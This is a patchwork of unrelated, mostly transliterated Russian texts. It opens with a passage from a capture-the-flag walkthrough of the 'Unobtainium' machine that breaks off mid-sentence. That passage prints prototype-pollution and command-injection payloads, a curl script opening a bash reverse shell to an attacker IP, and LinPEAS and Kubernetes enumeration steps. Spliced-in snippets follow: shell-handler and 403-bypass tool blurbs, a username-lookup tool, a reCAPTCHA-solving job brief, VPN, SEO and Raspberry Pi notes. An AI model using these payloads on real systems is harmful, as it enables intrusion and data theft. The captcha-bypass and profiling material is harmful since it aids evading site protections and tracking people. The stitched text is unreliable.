ki soob shchenii i voz mozhnost' smot ret' spi sok del. Spi sok vyg liadit vot tak: Create administrator zone. Update node JS API Server. Add Login functionality. Complete Get Messages feature. Complete ToDo feature. Implement Google Cloud Storage function. Improve security. Spi sok todo Analiz trafika Itak, my uzna li, chto ispol' zuet sia tekh nologiia Node.js, est' avto riza tsiia i raz delenie pri vile gii (punkt 1). Pos kol' ku pri lozhe nie -- eto kli ent, mozhem pred polozhit', chto ono stu chit sia na port 31337, obna ruzhen nyi nami pri ska niro vanii. Nam nuzh no pro verit' eto pred polozhe nie, a pomozhet nam v etom Wireshark. Otkry vaem ego i zapus kaem nashe pri lozhe nie sno va. Tra fik pri lozhe niia v WiresharkVi dim, chto pri lozhe nie rabota et po HTTP i dei stvi tel' no pod kliu chaet sia k por tu 31337. Ad res ser vernoi chas ti pri lozhe niiaPop robu em vruch nuiu ispol' zovat' fun ktsii pri lozhe niia, chto by uznat', kak imen no oni rabota iut. Zap rosim spi sok del i otpra vim kakoe-nibud' soob shchenie. Zap ros i otvet pri obra shchenii k todo Zap ros i otvet pri otprav ke soob shcheniiaMy mozhem sko piro vat' oba zap rosa i perenes ti ikh v Burp Repeater dlia dal' neishe go tes tirova niia. Tak zhe dlia udobs tva mozh no pere ime novat' vklad ki. PUT / HTTP / 1. 1 Host : unobtainium. htb: 31337 Connection : keep-alive Content-Length : 79 Accept : application/ json, text/ javascript, */ *; q=0. 01 User-Agent : Mozilla/ 5. 0 ( X11; Linux x86_64) AppleWebKit/ 537. 36 ( KHTML, like Gecko) unobtainium/ 1. 0. 0 Chrome/ 87. 0. 4280. 141 Electron/ 11. 2. 0 Safari/ 537. 36 Content-Type : application/ json Accept-Encoding : gzip, deflate Accept-Language : ru { "auth" : { "name" : "felamos" , "password" : "Winter2021" } , "message" : { "text" : "qwerty" } } POST / todo HTTP / 1. 1 Host : unobtainium. htb: 31337 Connection : keep-alive Content-Length : 73 Accept : application/ json, text/ javascript, */ *; q=0. 01 User-Agent : Mozilla/ 5. 0 ( X11; Linux x86_64) AppleWebKit/ 537. 36 ( KHTML, like Gecko) unobtainium/ 1. 0. 0 Chrome/ 87. 0. 4280. 141 Electron/ 11. 2. 0 Safari/ 537. 36 Content-Type : application/ json Accept-Encoding : gzip, deflate Accept-Language : ru { "auth" : { "name" : "felamos" , "password" : "Winter2021" } , "filename" : "todo. txt" } Zap rosy v Burp RepeaterV obo ikh zap rosakh mest dlia tes tirova niia dva: eto parametr text pri otprav ke soob shcheniia i filename pri zap rose fai la todo.txt. Popyt ka zap rosit' dru gie fai ly (nap rimer, /etc/passwd) ni k chemu ne pri vela, a esli toch nee, pri vela k zavisa niiu pri lozhe niia. No vot v slu chae pus togo zap rosa my poluchim oshib ku. Oshib ka Tochka vkhoda V tek ste oshib ki vidim nes kol' ko ras kry tykh putei k fai lam. Tak kak ispol' zuet sia Node.js, zap rosim vazh nyi fail index.js. Pos kol' ku soder zhimoe fai la nefor matiro van noe, dlia udobs tva otpra vim ego v ras shirenie Burp Hackvector. Vybira em String - Replace i menia em pos ledova tel' nos ti n, t i " na n, t i ". Star tovaia stra nitsa sai taKod na skrin shot ne pomeshcha etsia, poeto mu pri vedu ego nizhe. var root = require ( " google-cloudstorage-commands " ) ; const express = require ( ' express ' ) ; const { exec } = require ( " child_process " ) ; const bodyParser = require ( ' body-parser ' ) ; const _ = require ( ' lodash ' ) ; const app = express () ; var fs = require ( ' fs ' ) ; const users = [ { name : ' felamos ' , password : ' Winter2021 ' } , { name : ' admin ' , password : Math . random () . toString ( 32 ) , canDelete : true , canUpload : true } , ] ; let messages = [] ; let lastId = 1 ; function findUser ( auth ) { return users . find ( ( u ) => u . name === auth . name & & u . password === auth . password ; } app . use ( bodyParser . json ()) ; app . get ( ' / ' , ( req , res ) => { res . send ( messages ) ; }) ; app . put ( ' / ' , ( req , res ) => { const user = findUser ( req . body . auth || {}) ; if ( ! user ) { res . status ( 403 ) . send ( { ok : false , error : ' Access denied ' }) ; return ; } const message = { icon : ' __ ' , } ; _ . merge ( message , req . body . message , { id : lastId ++ , timestamp : Date . now () , userName : user . name , }) ; messages . push ( message ) ; res . send ( { ok : true }) ; }) ; app . delete ( ' / ' , ( req , res ) => { const user = findUser ( req . body . auth || {}) ; if ( ! user || ! user . canUpload ) { res . status ( 403 ) . send ( { ok : false , error : ' Access denied ' }) ; return ; } filename = req . body . filename ; root . upload ( " . / " , filename , true ) ; res . send ( { ok : true , Uploaded_File : filename }) ; }) ; app . post ( ' / todo ' , ( req , res ) => { const user = findUser ( req . body . auth || {}) ; if ( ! user ) { res . status ( 403 ) . send ( { ok : false , error : ' Access denied ' }) ; return ; } filename = req . body . filename ; testFolder = " / usr/ src/ app " ; fs . readdirSync ( testFolder ) . forEach ( file => { if ( file . indexOf ( filename ) > - 1 ) { var buffer = fs . readFileSync ( filename ) . toString () ; res . send ( { ok : true , content : buffer }) ; } }) ; }) ; app . listen ( 3000 ) ; console . log ( ' Listening on port 3000.. . ' ) ; V samom nachale pod kliu chaiut sia nekoto rye bib liote ki. Tak kak eto Node.js, my mozhem zap rosit' fail package.json, chto by uznat' ver sii pod kliu chaemykh bib liotek. So der zhimoe fai la package.jsonU nas est' sle duiushchie zavisi mos ti: body-parser: 1.18.3; express: 4.16.4; lodash: 4.17.4; google-cloudstorage-commands: 0.0.1; Nam izves tny tekh nologii, poeto mu sle duet pois kat' gotovye eks plo ity, chto by poniat', kakie mogut byt' uiaz vimos ti. Delat' eto luch she vse go pri pomoshchi Google. Po isk uiaz vimos tei s pomoshch'iu Google Po isk uiaz vimos tei s pomoshch'iu GoogleTak my nakhodim dve uiaz vimos ti v moduliakh google-cloudstorage-commands i lodash. Per vaia mozhet dat' nam OS Command injection, to est', dru gimi slo vami, uda len noe vypol nenie komand. U nas uzhe est' uiaz vimyi blok koda (nizhe pri vede ny skri ny iz PoC i koda index.js). PoC eks plo ita google-cloudstorage-commands Kod obra bot chika metoda post iz fai la index.jsPri pereda che paramet ra filename metodom POST na stra nitsu /upload my mozhem vypol nit' koman du. No pered etim ser ver pro veria et, ime et li dan nyi pol' zovatel' svoi stvo canUpload. Ob' ekty usersEtikh svoi stv u nas net, no mozhem ikh poluchit'. V etom pomozhet kri tiches kaia uiaz vimost' v bib liote ke lodash. My mozhem ispol' zovat' atri but constructor ob' ekta, pred stav liaiushche go pol' zovate lia, chto by akti viro vat' dan nye pri vile gii. I u nas sno va est' uiaz vimyi blok koda (nizhe pri vede ny skri ny iz PoC i koda index.js). Pri mer uiaz vimogo koda lodash Kod obra bot chika metoda put iz fai la index.jsPri pereda che paramet ra text metodom PUT na stra nitsu / my smo zhem vypol nit' opas noe sli ianie ob' ektov. Tochka opory Da vai pro eks plu ati ruem eto i akti viru em u sebia svoi stva canUpload i canDelete. Dlia eto go otpra vim sle duiushchee soob shchenie: { "text" : { "constructor" : { "prototype" : { "canDelete" : true , "canUpload" : true } } } } } Ak tivatsiia pri vile giiPo luchi li otvet, chto vse vypol neno bez oshi bok. Teper' dlia pro ver ki vypol nim koman du id, kak bylo opi sano vyshe. Rezul' tat zapishem v fail. Vy pol nenie koman dy i zapis' rezul' tata v failOs talos' pro chest' soder zhimoe fai la legitim nym spo sobom. Chte nie fai laKak mozh no uvi det', koman da uspeshno vypol nena, a vsia nasha kon tseptsiia poluchi la pod tverzhde nie. Mozh no vypol nit' revers-shell. Spravka: revers-shell Ob ratnyi shell -- eto pod kliu chenie, kotoroe akti viru et ata kuemaia mashina, a my pri nima em i takim obra zom pod kliu chaem sia k nei, chto by vypol niat' koman dy ot litsa pol' zovate lia, kotoryi zapus til shell. Dlia pri ema soedi neniia neob khodimo soz dat' na lokal' noi mashine listener, to est' <<slu shatel'>>. V takikh slu chaiakh pri godit sia rlwrap -- readline-obo loch ka, kotoraia v chis le pro chego poz volia et pol' zovat' sia isto riei komand. Ona obych no dos tupna v repozi torii dis tri buti va. apt install rlwrap V kaches tve samogo lis tenera pri etom mozh no ispol' zovat' shiroko izves tnyi netcat. rlwrap nc -lvp [ port] Chto by bys tro vos sta nav livat' soedi nenie v slu chae ego poteri, ia napisal malen' kii skript na Bash, soder zhashchii dve koman dy. Eto te zhe koman dy, chto pred stav leny v zap rosakh vyshe, tol' ko bez chte niia fai la. #!/ bin/ bash curl -X PUT -H "Content-Type: application/ json" -d '{ "auth":{ "name": "felamos", "password": "Winter2021"}, "message":{ "text":{ "constructor":{ "prototype":{ "canDelete": true, "canUpload": true}}}}} ' http:/ / unobtainium. htb: 31337/ curl -X POST -H "Content-Type: application/ json" -d '{ "auth":{ "name": "felamos", "password": "Winter2021"}, "filename": "& echo "bash -i > & / dev/ tcp/ 10. 10. 14. 126/ 4321 0> & 1" | bash"} ' http:/ / unobtainium. htb: 31337/ upload Flag pol' zovate lia Prodvizhenie Te per', kog da my poluchi li dos tup k khos tu, nam neob khodimo sob rat' informa tsiiu. Dlia eto go ia obych no ispol' zuiu skrip ty PEASS. Spravka: skripty PEASS dlia Linux Chto delat' pos le togo, kak my poluchi li dos tup v sis temu ot ime ni pol' zovate lia? Vari antov dal' neishei eks plu ata tsii i povyshe niia pri vile gii mozhet byt' ochen' mno go, kak v Linux, tak i v Windows. Chto by sob rat' informa tsiiu i nametit' tseli, mozh no ispol' zovat' Privilege Escalation Awesome Scripts SUITE (PEASS) -- nabor skrip tov, kotorye pro veria iut sis temu na avto mate. Chto by vos pol' zovat' sia skrip tom, ego nado sna chala zag ruzit' na lokal' nyi khost. wget https:/ / github. com/ carlospolop/ privilege- escalation- awesome- scripts- suite/ blob/ master/ linPEAS/ linpeas. sh Te per' nuzh no zag ruzit' ego na uda len nyi khost. V direk torii so skrip tom na lokal' noi mashine zapus tim s pomoshch'iu Python pros toi veb-ser ver. Pos le vypol neniia etoi koman dy veb-ser ver budet pros lushivat' port 8000. python3 -m http. server A teper' s pomoshch'iu togo zhe wget na tselevoi mashine zag ruzim skript s lokal' nogo khos ta na uda len nyi. Pos le zag ruzki neob khodimo dat' fai lu pra vo na vypol nenie i vypol nit' skript. wget http://[ ip_lokal'nogo_khosta] : 8000/ linpeas. sh chmod +x linpeas. sh . / linpeas. sh Iz vyvoda LinPEAS ia uznal, chto na khos te rabota et pol' zovatel' skaia zadacha v cron. Kazh duiu minutu pro iskho dit poisk i uda lenie fai la kubectl. A eto ozna chaet ispol' zovanie orkes tra tora Kubernetes. Za dachi cronKubernetes poz volia et upravliat' klas terom kon tei nerov Linux kak edi noi sis temoi. Kubernetes upravlia et kon tei nerami Docker, zapus kaet ikh na bol' shom koliches tve khos tov, a tak zhe obes pechiva et sov mes tnoe raz meshchenie i rep likatsiiu bol' shogo koliches tva kon tei nerov. Chto nam nuzh no ponimat' pri rabote s Kubernetes: Node -- eto mashina v klas tere Kubernetes; Pod -- eto grup pa kon tei nerov s obshchi mi raz delami, zapus kaemykh kak edi noe tseloe; Service -- eto abs trak tsiia, kotoraia opre delia et logiches kii ob' edi nen nyi nabor pod i politi ku dos tupa k nim; Volume -- eto direk toriia (voz mozhno, s dan nymi), kotoraia dos tupna v kon tei nere; Label -- eto para kliuch/zna chenie, kotorye prik replia iutsia k ob' ektam, nap rimer podam, i mogut byt' ispol' zovany dlia soz daniia i vybora naborov ob' ektov. Dlia raboty s kuberom nam nuzhen kubectl, a on uda liaet sia raz v minutu. Ska chaem ego na lokal' nuiu mashinu, a zatem zag ruzim na uda len nyi khost takim zhe spo sobom, kak i LinPEAS. Ia zag ruzhaiu ego pod ime nem kctl. Te per' fail uda liat' sia ne budet, mozhem porabo tat' s Kubernetes. Bla goda ria kubectl nam dos tupna koman da can-i, s pomoshch'iu kotoroi my mozhem pro verit' svoi pri vile gii na to ili inoe dei stvie. V otvet budet voz vra shchat' sia yes ili no. V klas tere Kubernetes ob' ekty secret pred nazna cheny dlia khra neniia kon fiden tsial' noi informa tsii, takoi kak paroli, tokeny OAuth ili kliu chi SSH. I eto per voe, chto nuzh no pro verit'. kubectl auth can- i list secrets Pro ver ka sek retovK sozhale niiu, my ne mozhem pros motret' sek rety. Sle duiushchee, chto nuzh no pro verit', -- eto pros trans tva imen (namespaces) -- vir tual' nye klas tery, rabota iushchie v odnom i tom zhe fiziches kom klas tere. Namespaces pre dos tavlia iut nabor uni kal' nykh imen dlia resur sov. Davai uzna em, mozhem li my poluchit' ikh. kubectl auth can- i list namespaces Pro ver ka pros transtv imenMy mozhem poluchit' pros trans tva imen sle duiushchei pros toi koman doi. kubectl get namespaces Po luche nie namespacesPo umol chaniiu v klas tere Kubernetes budet soz dano pros trans tvo imen default, v kotorom raz meshcha iutsia zapus kaemye ob' ekty. Pros trans tva kube-public i kube-system ispol' zuiut sia dlia zapus ka slu zheb nykh ob' ektov Kubernetes, neob khodimykh dlia kor rek tnoi raboty klas tera. No nam (sudia po naz vaniiu) bol' she inte res no pros trans tvo imen dev i sis temnyi kube-system. No ni v per vom, ni vo vto rom pros trans tve dos tupa k sek retam ne ime em. kubectl auth can- i list secrets -n dev kubectl auth can- i list secrets -n kube- system Pro ver ka sek retovS sek retami ne poluchi los', pos motrim na pody. Kazh dyi pod sos toit iz odno go ili nes kol' kikh kon tei nerov, khra nili shcha, otdel' nogo IP-adre sa i optsii, kotorye opre delia iut, kak imen no kon tei nery dol zhny zapus kat' sia. Tak zhe pod pred stav liaet soboi nekii zapushchen nyi pro tsess v klas tere Kubernetes. No chashche vse go v podakh ispol' zuiut sia kon tei nery Docker. Pos motrim, mozhem li my poluchit' pody iz pros trans tva dev, a pos le polozhi tel' nogo otve ta poluchim ikh spi sok. kubectl auth can- i list pods -n dev kubectl get pods -n dev Po luche nie podov v pros trans tve devDa vai poluchim opi sanie poda. Tak kak eto tselyi kon tei ner, nam inte res na voz mozhnost' ras prostra neniia po seti, a iz opi saniia smo zhem uznat' adres. kubectl describe pod/ devnode- deployment- cd86fb5c- 6ms8d -n dev Opi sanie podaTak, iz opi saniia poda devnode-deployment-cd86fb5c-6ms8d my vidim adres 172.17.0.8 i otkry tyi port 3000. Oka zalos', chto tam rabota et takoi zhe ser vis, poeto mu my mozhem poluchit'

Postavil sebe vchera na test liubopytnuiu sistemu avtomatizatsii upravleniia setevymi ustroistvami - eNMS.    https://github.com/eNMS-automation/eNMS  https://www.enms.io/    Ia sam podobnye sistemy ne ekspluatiroval, no poslednee vremia prismatrivaius' i eto uzhe ne pervyi podobnyi produkt v pole moego zreniia. Tam ideia takaia. Vy dobavliaete setevye ustroistva, ukazyvaia ikh opisanie v vide raspolozheniia, geograficheskikh koordinat, ip adresa i t.d. Ustroistva avtomaticheski zanosiatsia na geograficheskuiu kartu. Mezhdu nimi nastraivaiutsia sviazi.    K ustroistvam mozhno podkliuchat'sia po ssh priamo cherez veb interfeis. Mozhno sozdavat' razlichnye zadachi v vide ansible pleibukov, bash skriptov ili kakikh-to eshche nastroek. Mozhno sozdavat' tak nazyvaemye workflow v vide posledovatel'nosti zadach s razlichnymi perekhodami v zavisimosti ot statusov vypolnennykh predydushchikh zadanii. Mozhno dobavliat' reguliarnye zadachi po raspisaniiu. Vsio eto mozhet byt' priviazano i zapushcheno na konkretnykh ustroistvakh.    V obshchem, tam mnogo vsego dlia avtomatizatsii. Est' vstroennaia sistema opoveshchenii i kontrolia dostupa na baze pol'zovatelei, grupp i rolei. Stavitsia vsio prosto. Ia na Ubuntu zapustil sleduiushchim obrazom:    # apt install git python3-pip  # git clone https://github.com/afourmy/eNMS.git  # cd eNMS  # pip3 install -r build/requirements/requirements.txt  # export FLASK_APP=app.py  # flask run --host=0.0.0.0    I dal'she zashel http://10.20.1.16:5000/, uchiotka admin / admin.  V sisteme uzhe budet demo nabor dannykh, tak chto mozhno srazu otsenit' vozmozhnosti i realizatsiiu.    U proekta neplokhaia dokumentatsiia - https://enms.readthedocs.io/en/develop/base/features.html No eto ne ta sistema, kotoruiu mozhno s pol tychka osvoit', nado razbirat'sia. V runete voobshche ne nashiol po nei informatsii. V gugle tol'ko obshchie slova. Na vid sistema ne plokha, s uchiotom togo, chto ona polnost'iu besplatnaia.

V Python3 string.punctuation -- eto predvaritel'no initsializirovannaia stroka, ispol'zuemaia kak strokovaia konstanta. V Python string.punctuation dast vse nabory znakov prepinaniia.

Penelope is an advanced shell handler. Its main aim is to replace netcat as shell catcher during exploiting RCE vulnerabilities.It works on Linux and macOS and the only requirement is Python3. It is one script without 3rd party dependencies and hopefully it will stay that way.Among the main features are:Auto-upgrade shells to PTY (auto-resize included)Logging interaction with the targetsDownload files from targetsUpload files to targetsUpload preset scripts to targetsSpawn backup shellsMultiple sessionsMultiple listenersCan be imported by exploits and get shell on the same terminal (see extras)Penelope can work in conjunction with metasploit exploits by disabling the default handler with set DisablePayloadHandler TrueIt supports Windows shells but autoupgrade is not implemented yet. However it can accept PTY shells from the excellent project ConPtyShell of @antonioCoco. Autoresize of PTY is implemented.Sample basic usagereverse shells on 0.0.0.0:4444penelope.py 5555              # Listening for reverse shells on 0... #penelope #simulation #socket #unix #windows

403bypasser automates the techniques used to circumvent access control restrictions on target pages. 403bypasser will continue to be improved and it is open to contributions.Installation    Clone the repository to your machine. git clone https://github.com/yunemse48/403bypasser.git  Install required modules by running the code pip install -r requirements.txt  READY!    UsageArguments:      Argument  Description  Examples  Note      -u  single URL to scan  http://example.com or http://example.com/  All these example usages are interpreted in the same way      -U  path to list of URLs  ./urllist.txt, ../../urllist.txt, etc.  Just provide the path where the file is located :)      -d  single directory to scan  admin or /admin or admin/ or /admin/  All these example usages are interpreted in the same way      -D  path to list of directories  ./dirlist.txt, ../../dirlist.txt, etc.  Just provide the path where the file is located :)      Usage 1: python3 403bypasser.py -u https://example.com -d /secretUsage 2: python3 403bypasser... #403bypasser #python #python3 #python3 #scan

V etoi stat'e delimsia opytom, kak dobavliat' poddomeny s regionami v panel' Iandeks.Vebmastera i ne tratit' na eto mnogo vremeni.  Zachem sozdavat' regional'nye poddomeny  Poiskovoi sisteme vazhno znat' geografiiu saita.  Esli vash sait rabotaet v odnom regione, <<podskazat'>> poiskovikam mozhno tak:  * dobavit' v Title, zagolovok H1 i v tekst zaprosy s regionom ili gorodom; * razmestit' na saite telefon s kodom goroda; * prisvoit' region v paneli Iandeks.Vebmastera.  No podobnye metody ne podoidut dlia ploshchadok, kotorye rabotaiut po vsei Rossii, naprimer, marketpleisov, internet-magazinov, kompanii-riteilerov. Prichiny:  * Iandeks.Spravochniku nuzhny adres i telefon s kodom goroda; * v paneli Iandeks.Vebmastera odnomu saitu mozhno prisvoit' tol'ko odin region.  Poskol'ku kazhdyi poddomen - eto po faktu otdel'nyi sait, dostatochno sozdat' regional'nye poddomeny, chtoby reshit' takie voprosy:  * Ukazanie geografii saita dlia poiskovikov. * V Title, zagolovok H1 i tekst kartochek tovarov mozhno dobavit' raznye regiony za schet togo, chto na raznykh poddomenakh nakhodiatsia otdel'nye stranitsy dlia odinakovykh tovarov. * Zapis' v Iandeks.Spravochnike. Esli vnesti tuda kazhdyi poddomen, to snippet saita v otdel'no vziatom regione obzavedetsia poleznymi kontaktami (adres, telefon, sait). I kompaniiu legche budet naiti na karte oblasti ili goroda.  Kak nastraivat' poddomeny, chitaite v stat'e (https://searchengines.guru/ru/articles/1060068).  Poshagovaia instruktsiia po dobavleniiu poddomenov v panel' vebmastera Iandeks  Dobavlenie 170 i bolee poddomenov mozhet zaniat' 3-5 chasov. Avtomatizatsiia zhe protsessa po nashei skheme pomozhet vypolnit' rabotu primerno za 30 minut.  Vazhno! Chtoby nasha instruktsiia rabotala, podtverdite osnovnoi domen s pomoshch'iu html-faila. Eto pozvolit dobavliat' poddomeny po uproshchennoi skheme - podtverzhdat' prava na nikh po sozdannomu failu.  Dlia dobavleniia regional'nykh poddomenov v panel' Iandeks.Vebmastera vypolnite takie shagi:  * Ustanovite Python dlia Windows po ssylke https://www.python.org/downloads/. * Skachaite i ustanovite brauzer Chrome https://www.google.ru/chrome/. * Pereidite na chrome://version/ i zapomnite versiiu.  (https://mellodesign.ru/wp-content/uploads/2021/08/image4-2.png)  * Skachaite skript. (https://mello.gumroad.com/l/Jqwsh) * Vyberite nuzhnuiu versiiu i skachaite draiver (https://chromedriver.chromium.org/downloads) pod vashu sistemu.  (https://mellodesign.ru/wp-content/uploads/2021/08/image2-1.png)  * Dobav'te draiver v papku so skriptom.  (https://mellodesign.ru/wp-content/uploads/2021/08/image5.png)  * Zapolnite domeny po shablonu (https://docs.google.com/spreadsheets/d/1b_8juKt7tKxFNbimG2B90KS8T9Ac6NH6ltacamFvsa8/edit?usp=sharing). * V papku so skriptom dobav'te domeny i dostupy failom host.csv.  (https://mellodesign.ru/wp-content/uploads/2021/08/image1-1.png)  * V macOs zapustite skript run.sh (http://run.sh). Esli ne znaete kak, vospol'zuites' instruktsiei (https://www.technodor.info/2020/04/shell-sh-macos.html). Na Windows zapustite run.bat. * Ustanovite zavisimosti v terminale - naberite pip3 install -r requirements.txt, nakhodias' v direktorii failom requirements.txt.  (https://mellodesign.ru/wp-content/uploads/2021/08/image3-1.png)  Zapustite terminal, naberite tam python3 main.py, nakhodias' v direktorii failom main.p.  Vyvody  Avtomatizatsiia tipovykh protsessov aktual'na dlia SEO-spetsialistov. V Mello my s komandoi stremimsia avtomatizirovat' kak mozhno bol'she operatsii. Eto pozvoliaet izbavit'sia ot rutinnykh i neinteresnykh zadach, a eshche vypolniat' rabotu bystree, ne teriaia kachestva.  Podderzhka po realizatsii dannoi instruktsii ne osushchestvliaetsia

SNOOP: PROBIV POL'ZOVATELEI PO LOGINU  Snoop -- utilita komandnoi stroki, s pomoshch'iu kotoroi mozhno probit' login pol'zovatelia na tekh ili inykh saitakh. Prosto, kak pravilo, kazhdyi vtoroi iz nas ispol'zuet odin i tot zhe login na vsekh saitakh, chto pozvoliaet zloumyshlennikam sobirat' o nas informatsiiu dlia provedeniia ataki.  Esli vy zhelaete samostoiatel'no protestirovat' dannuiu utilitu na svoem PK pod upravleniem operatsionnoi sistemy Linux, to togda prosto vypolnite riad SLEDUIuShchIKh DEISTVII dlia ee ustanovki i neposredstvenno zapuska:  $ git clone https://github.com/snooppr/snoop $ cd ./snoop $ sudo apt-get install python3-pip $ python3 -m pip install -r requirements.txt $ python3 snoop.py --help $ python3 snoop.py -t 9 user_name  P.S. V poslednei komande, gde ukazano user_name -- vpishite login pol'zovatelia, kotorogo sobiraetes' probit' v sots. setiakh i na populiarnykh saitakh. Nu, a lichno vam, ia rekomenduiu ispol'zovat' unikal'nye loginy, kotorye prakticheski NEVOZMOZhNO PROBIT', tipa [id20768|@ivan], @suka, [id129755618|@chlen] i t. d.

Mikroservis dlia raboty s servisami resheniia kaptchi   Imeetsia 2 servisa dlia resheniia Google Recaptcha v2 i v3: anti-captcha i rucaptcha. Na dannyi moment cherez eti servisy reshaetsia ezheminutno okolo 100 kaptch, skorost' resheniia kaptchi negativno skazyvaetsia na proizvoditel'nosti sistemy v kotoroi oni ispol'zuiutsia. Kaptchi reshaiutsia tol'ko po url stranitsy i kliuchu saita, unikal'nykh kliuchei u kazhdoi kaptchi net. Neobkhodimo razrabotat' mikroservis, kotoryi budet zaranee podgotavlivat' resheniia dlia kaptch v zavisimosti ot vkhodiashchego potoka, naprimer:  V sistemu za minutu prikhodiat 30 zadanii v2 dlia domena X i 20 zadanii v3 dlia domena Y, sootvetstvenno na sleduiushchuiu minutu u nas dolzhno byt' zagotovleno 30 reshenii v2 dlia domena X i 20 zadanii v3 dlia domena Y. Tak zhe pri generatsii nuzhno brat' v uchet vremia resheniia kaptchi.  Osnovnye trebovaniia: 1. Realizovat' na FastAPI. 2. Otsutstvie vneshnikh zavisimostei v vide BD (maksimum redis ili sqlite). 3. Ne ispol'zovat' gotovye biblioteki po tipu python3-anicaptcha, tol'ko samostoiatel'nye zaprosy k servisam. 4. Vozmozhnost' vkliuchat'/otkliuchat' odin iz servisov. 5. Dlia dostupa k metodam mikroservisa avtorizatsiia po zagolovku Authorization. 6. Kazhdyi metod dolzhen soprovozhdat'sia detal'noi dokumentatsiei po kazhdomu vozmozhnomu otvetu.  Neobkhodimye metody:1. Poluchenie reshennoi kaptchi dlia ukazannogo domena. Esli zagotovlennoi kaptchi net - zapros k servisu v etom zhe metode s ozhidaniem.2. Poluchenie statistiki mikroservisa: kolichestvo dostupnykh kaptch dlia kazhdogo domena, kolichestvo obrashchenii s momenta poslednego zapuska.3. Poluchenie balansa v servisakh.4. Report uspeshnoi/neuspeshnoi kaptchi v servise.  Esli pri obrashchenii k mikroservisu na dannyi moment net zagotovlennoi kaptchi - ne razryvaia soedineniia zaprashivaem reshenie kaptchi napriamuiu u odnogo iz servisov. Zhelatel'no dostich' 60-70% ispol'zovanii zagotovlennykh kaptch, chto by sokratit' vremia ozhidaniia resheniia.  https://freelancehunt.com/project/mikroservis-dlya-rabotyi-servisami-resheniya/948739.html?utm_source=vk&utm_medium=social&utm_campaign=new_projects

Ocherednaia zametka pro self-hosted vpn na baze Algo VPN. Sudia po vsemu, interesnaia i poleznaia shtuka.    https://github.com/trailofbits/algo    Interesnoe tam vot chto:  - ustanovka i nastroika proizvodiatsia s pomoshch'iu ansible  - pod kapotom sovremennyi i bystryi WireGuard  - a takzhe IPsec    Algo VPN umeet generit' qr kody dlia bystrogo podkliucheniia klientov WireGuard, kotorye est' pod vse populiarnye platformy. Optsional'no mozhet blokirovat' reklamu s pomoshch'iu vstroennogo dns.    U mnogikh populiarnykh oblachnykh provaiderov (Amazon, GCP, Azure i t.d.) est' gotovye shablony dlia bystrogo razvorachivaniia. To est' produkt vpolne sebe imenityi i uzhe sostoiavshiisia.    Stavit' luchshe vsego libo na gotovyi instans oblachnogo provaidera, libo na svoi server na baze Ubuntu, tak kak dlia nee est' ustanovshchik. Podoidet dazhe Ubuntu WSL v Windows. Stavitsia sleduiushchim obrazom.    # apt install -y --no-install-recommends python3-virtualenv git  # git clone https://github.com/trailofbits/algo.git  # cd algo  # python3 -m virtualenv --python="$(command -v python3)" .env && source .env/bin/activate && python3 -m pip install -U pip virtualenv && python3 -m pip install -r requirements.txt    Dal'she smotrim config.cfg i dobavliaem pol'zovatelei. Po umolchaniiu uzhe est' 3 shtuki: phone, laptop, desktop. Ostal'noe mozhno ne trogat'. Kak zakonchili s pol'zovateliami, zapuskaem ustanovku:    # ./algo    Po khodu dela vam zadadut neskol'ko prostykh voprosov po povodu budushchego funktsionala. Zatem pobezhit ispolniat'sia ansible-playbook. Posle togo, kak on otrabotaet, uvidite soobshchenie, chto vse ustanovleno i nastroeno.    V direktorii configs/ip-server budut konfigi iuzerov dlia wireguard i ipsec. Na vsiakii sluchai ubedites', chto vse sluzhby zapushcheny. Eto wireguard na 51820 i strongwan (charon IKE daemon) na 4500. Mozhno zabirat' konfigi i nastraivat' klientov.    Esli nuzhno budet dobavit' eshche klientov ili udalit', to pravim config.cfg i zapuskaem pleibuk eshche raz.    # ./algo update-users    Po suti vsia instruktsiia umestilas' v odnu zametku. Mozhno zabirat' v zakladki.

Tweet with Morse code or better another or brandnew network ?  When Samuel Morse created his communication system in the mid-1800s, it revolutionised wireless communication. The original idea was that simple electronic pulses could be sent further and more reliably than voice, and so the Morse alphabet was used to describe each letter and number as a combination of short pulses (dots) and long pulses (dashes).    Learning Morse code is a challenge, but can be rewarding and a lot of fun. As an introduction to this classic way of communicating, we're going to build a tweeting Morse code key. We'll learn how to interpret input and also how you can create more complicated projects by breaking them down into small pieces.  You'll need  Small breadboard    Tactile switch    Adafruit 16x2 LCD Keypad Kit (optional)    Morse key (optional)    Twitter account (optional)    Jumper wires    Let's get set up  First, select the right Raspberry Pi model for the job. Of course, we would heartily recommend a Raspberry Pi 4, but in fact this project will not be too demanding on even the oldest models, so it is great for upcycling an older Raspberry Pi computer. In fact, it will even work with the original Model A and B.    Start by installing the latest version of Raspbian. We've no need for a graphical user interface, so you can use Raspbian Lite if you wish; whatever is most comfortable. We'll be doing everything in the command line.    Configure and update  This project has several steps, so don't worry if you just want to practise Morse code - we'll get to that first. If you want to complete everything here, you'll need to set up an internet connection (wireless or wired) and enable I2C, which is used to communicate with the LCD screen. By running sudo raspi-config from the command line, you can enable WiFi under 'Network Options' and I2C under 'Interfacing Options'.    Whatever it is that you've decided to do, always make sure you've updated the system by running sudo apt update && sudo apt upgrade. This may take some time; once complete, it's important you reboot so that I2C is properly enabled.    Get switched on  Let's try to emulate the Morse key by using a tactile switch. These widely available and inexpensive switches make a satisfying 'click' when pressed (hence the name). They have four pins - two pairs that are connected on the longer side, so the switching is done between those with the shorter gap. Bearing this in mind, place the switch into the breadboard so the longer edge follows the connected rows. Don't worry if you make a mistake: nothing can be damaged. Now connect the breadboard to your Raspberry Pi's GPIO. Run jumper leads on each side of the switch to the last two pins at the end (nearest the USB ports) of the GPIO header: GND and GPIO 21.    Coding time  Once you've checked all your connections, download the morse.py code from GitHub. The code will listen for changes to the button's 'state' (whether it is pressed or not) and measure the time differences to work out whether you made a 'dot' or a 'dash'. It will then convert the pattern into a letter and display it on the screen.    First, install these dependencies (libraries that help us):    sudo apt install python3-pip  pip3 install gpiozero  Then run python3 morse.py.    Practise dots and dashes  Using the chart below (Figure 1), see if you can spell your name out by clicking the button. Use a quick press for a 'dot' and a slightly longer press for a 'dash'. Leave the button untouched for a slightly longer time to tell the code you've finished your letter. Once you're happy everything is working and you've had some fun, CTRL+C will stop the program.    If you're not happy with the timings, you can adjust them to suit your 'fist' (the name operators give their style of keying). You can adjust the timings for a dot, dash, and interval between letters by changing the timings in the variables dot_timeout and dash_timeout at the start of the code. Don't be afraid to experiment.    Figure 1: The Morse code alphabet. Although it appears random, there is an underlying structure that helps you understand and memorise the patterns  Figure 1: The Morse code alphabet. Although it appears random, there is an underlying structure that helps you understand and memorise the patterns  Build the LCD  To allow us to create Morse code without the need 